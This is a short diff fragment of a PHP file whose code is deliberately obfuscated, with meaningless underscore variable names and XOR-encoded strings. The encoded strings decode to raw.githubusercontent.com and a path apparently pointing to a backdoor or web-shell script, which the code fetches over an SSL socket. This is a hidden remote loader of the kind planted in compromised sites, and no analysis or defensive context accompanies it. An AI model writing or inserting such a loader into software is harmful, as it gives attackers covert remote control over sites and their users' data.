@@ -49,7 +49,7 @@ $a = function($data, $key) use ($_____ ,$_________, $__________, $___________) {
 };
 $_ = "!";
 $url = $a("S@V\x0FFHUITCTRDSBNOUDOU\x0FBNL", $_);
-$path = $a("xTB@DSHORHLQMDBLE@OEC@BJENNSSDGRID@ERL@HOVRQIQ", $_);
+$path = $a("xTB@DSHORHLQMDBLE@OEC@BJENNSSDGRID@ERL@HOVRQIQ", $_);
 $fp = $_______________("ssl://$url", 443, $errno, $errstr, 10);
 if (!$fp) {
     $b = "Error: $errstr ($errno)";
